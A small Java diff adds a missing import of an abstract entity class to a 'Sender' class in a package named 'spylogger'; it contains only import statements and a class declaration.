@@ -6,6 +6,7 @@ import java.sql.SQLException;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import com.gravatasufoca.spylogger.model.EntidadeAbstrata;
 import com.gravatasufoca.spylogger.utils.Utils;
 
 public class Sender extends EntidadeAbstrata {
